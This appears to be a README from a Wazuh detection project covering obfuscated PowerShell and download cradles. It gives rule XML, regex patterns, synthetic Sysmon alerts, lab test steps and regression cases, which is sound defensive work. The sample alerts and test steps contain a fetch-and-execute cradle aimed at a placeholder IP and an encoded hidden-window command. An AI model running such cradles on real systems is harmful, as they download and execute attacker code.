[All use cases](../../README.md#the-use-cases) · Previous: [UC10](../UC10-phishing-attachment/README.md) · Next: [UC12](../UC12-lolbin-downloads/README.md)

# UC11: Obfuscated PowerShell and download cradles

| | |
|---|---|
| **Tactic** | Execution |
| **ATT&CK** | [T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or Information, [T1059.001](https://attack.mitre.org/techniques/T1059/001/) PowerShell, [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer |
| **Runs on** | Windows 10 VM |
| **Top rule** | 111102 (level 12) |
| **Rules** | [`wazuh/rules/pp-110-uc11_powershell_rules.xml`](../../wazuh/rules/pp-110-uc11_powershell_rules.xml) |
| **Regression cases** | [`tests/cases/uc11.json`](../../tests/cases/uc11.json) |

## Why it matters

Almost every commodity intrusion on Windows runs PowerShell at some point: to hide its command line, to pull the next stage from the internet, or to run it straight from memory. A staff PC in a pilgrim agency has no reason to run encoded, hidden PowerShell.

## Log source

| Source | Where it is collected | Decoder |
|---|---|---|
| Sysmon process creation (event 1) | `Microsoft-Windows-Sysmon/Operational` on the Windows 10 VM (config `windows/pilgrim-sysmon.xml`) | Built-in `windows_eventchannel` |
| PowerShell script block logging (4104) | `Microsoft-Windows-PowerShell/Operational`, turned on by `windows/setup-windows.ps1` | Built-in `windows_eventchannel` |

## Detection logic

- 111101 (level 10): `-EncodedCommand` (any abbreviation, `-e` to `-encodedcommand`) with a base64 blob, or a hidden window.
- 111102 (level 12): a download cradle on the command line, i.e. a web download (`DownloadString`, `Invoke-WebRequest`, `iwr`, `irm`, `Start-BitsTransfer`...) and `Invoke-Expression`/`iex` in the same command.
- 111103 (level 12): the same cradle in the decoded script block (event 4104). This catches it even when the command line itself was encoded.

### Rules (3 alerting, 0 supporting)

| Rule | Level | Description | ATT&CK |
|---|---|---|---|
| 111101 | 10 | UC11 Obfuscated PowerShell on `$(win.system.computer)`: encoded command or hidden window (parent `$(win.eventdata.parentImage)`). | T1059.001, T1027 |
| 111102 | 12 | UC11 PowerShell download cradle on `$(win.system.computer)`: web content executed directly in memory. | T1059.001, T1105 |
| 111103 | 12 | UC11 PowerShell download cradle found in a decoded script block on `$(win.system.computer)` (event 4104). | T1059.001, T1105 |

<details>
<summary>Rule XML</summary>

```xml
<rule id="111101" level="10">
  <if_sid>61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)\\(powershell|pwsh)\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)\s[-/](e|ec|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}|\s[-/]w(indowstyle)?\s+h(idden)?\b</field>
  <field name="win.eventdata.parentImage" type="pcre2" negate="yes">(?i)\\(CcmExec|IntuneManagementExtension|AgentExecutor)\.exe$</field>
  <description>UC11 Obfuscated PowerShell on $(win.system.computer): encoded command or hidden window (parent $(win.eventdata.parentImage)).</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1027</id>
  </mitre>
  <group>pp_powershell,pp_execution,</group>
</rule>

<rule id="111102" level="12">
  <if_sid>61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)\\(powershell|pwsh)\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)^(?=.*\b(iex|invoke-expression)\b)(?=.*(downloadstring|downloaddata|net\.webclient|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer)).*$</field>
  <description>UC11 PowerShell download cradle on $(win.system.computer): web content executed directly in memory.</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
  <group>pp_powershell,pp_execution,</group>
</rule>

<rule id="111103" level="12">
  <if_sid>91802</if_sid>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)^(?=.*\b(iex|invoke-expression)\b)(?=.*(downloadstring|downloaddata|net\.webclient|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer)).*$</field>
  <description>UC11 PowerShell download cradle found in a decoded script block on $(win.system.computer) (event 4104).</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1105</id>
  </mitre>
  <group>pp_powershell,pp_execution,</group>
</rule>
```

</details>

## Example alerts

Real output from the Wazuh analysis engine, produced by replaying this use case's regression cases (taken from [`demo/sample-alerts.ndjson`](../../demo/sample-alerts.ndjson)).

**111102, level 12:** UC11 PowerShell download cradle on WIN10-LAB: web content executed directly in memory.

```
{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "channel": "Microsoft-Windows-Sysmon/Operational", "level": "4", "computer": "WIN10-LAB", "eventID": "1"}, "eventdata": {"ruleName": "-", "utcTime": "2026-11-11 10:00:00.000", "processGuid": "{11111111-2222-3333-4444-555555555555}", "processId": "4242", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "fileVersion": "10.0.19041.1", "description": "-", "product": "Microsoft Windows Operating System", "company": "Microsoft Corporation", "originalFileName": "PowerShell.EXE", "commandLine": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/a.ps1')\"", "currentDirectory": "C:\\\\Users\\\\ahmed\\\\", "user": "WIN10-LAB\\\\ahmed", "logonGuid": "{11111111-2222-3333-4444-000000000001}", "logonId": "0x3e7a1", "terminalSessionId": "1", "integrityLevel": "Medium", "hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "parentProcessGuid": "{11111111-2222-3333-4444-555555555554}", "parentProcessId": "4100", "parentImage": "C:\\\\Windows\\\\explorer.exe", "parentCommandLine": "C:\\\\Windows\\\\explorer.exe", "parentUser": "WIN10-LAB\\\\ahmed"}}}
```

**111101, level 10:** UC11 Obfuscated PowerShell on WIN10-LAB: encoded command or hidden window (parent C:\\Windows\\explorer.exe).

```
{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "channel": "Microsoft-Windows-Sysmon/Operational", "level": "4", "computer": "WIN10-LAB", "eventID": "1"}, "eventdata": {"ruleName": "-", "utcTime": "2026-11-11 10:00:00.000", "processGuid": "{11111111-2222-3333-4444-555555555555}", "processId": "4242", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "fileVersion": "10.0.19041.1", "description": "-", "product": "Microsoft Windows Operating System", "company": "Microsoft Corporation", "originalFileName": "PowerShell.EXE", "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "currentDirectory": "C:\\\\Users\\\\ahmed\\\\", "user": "WIN10-LAB\\\\ahmed", "logonGuid": "{11111111-2222-3333-4444-000000000001}", "logonId": "0x3e7a1", "terminalSessionId": "1", "integrityLevel": "Medium", "hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "parentProcessGuid": "{11111111-2222-3333-4444-555555555554}", "parentProcessId": "4100", "parentImage": "C:\\\\Windows\\\\explorer.exe", "parentCommandLine": "C:\\\\Windows\\\\explorer.exe", "parentUser": "WIN10-LAB\\\\ahmed"}}}
```

## How to test it live

Runs on: Windows 10 VM.

1. On the Windows VM, in PowerShell:
2. `$b=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'pilgrim lab'")); powershell -enc $b` gives 111101 (it just prints a line).
3. `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/none')"` gives 111102, and 111103 from the script block. Nothing is listening on 127.0.0.1, so it only prints a connection error.

The full lab procedure is in [`docs/live-test-runbook.md`](../../docs/live-test-runbook.md).

## False-positive control

- SCCM (`CcmExec`) and Intune agents use `-EncodedCommand` legitimately; they are excluded by parent process (`negate="yes"`), not by a global allowlist.
- The cradle rules need BOTH a download primitive and `iex`; either alone is common admin work (cases UC11-04/05).

## Regression cases

5 cases (3 positive, 2 negative) in [`tests/cases/uc11.json`](../../tests/cases/uc11.json), all passing in the [engine report](../../tests/lab-engine-report.md).

| Case | Kind | What it checks |
|---|---|---|
| UC11-01 | positive | Hidden PowerShell with an encoded command -> 111101 |
| UC11-02 | positive | Download cradle on the command line -> 111102 |
| UC11-03 | positive | Cradle seen in the decoded script block (4104) -> 111103 |
| UC11-04 | negative | SCCM agent running an encoded command (excluded by parent, no alert) |
| UC11-05 | negative | Admin downloads a report without executing it (no cradle alert) |

## How to improve it

- Turn on PowerShell transcription to a protected share for full session context.
- Add AMSI events (Defender 1116 with `AMSI` source) to the same correlation.

---

_Rifadah Pilgrim Services is a fictional organisation. Every name, account, address and document in these examples is synthetic._
